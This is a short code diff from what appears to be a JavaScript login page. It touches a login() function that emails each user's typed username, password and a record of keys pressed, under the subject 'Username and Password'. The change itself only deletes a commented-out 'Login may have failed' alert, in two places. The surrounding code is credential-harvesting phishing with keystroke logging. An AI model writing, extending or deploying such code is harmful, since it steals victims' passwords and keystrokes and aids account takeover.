@@ -145,7 +145,6 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
-//     createCustomAlert('Login may have failed'));
   
 
 }
@@ -352,7 +351,6 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
-//     createCustomAlert('Login may have failed'));
   
 
 }
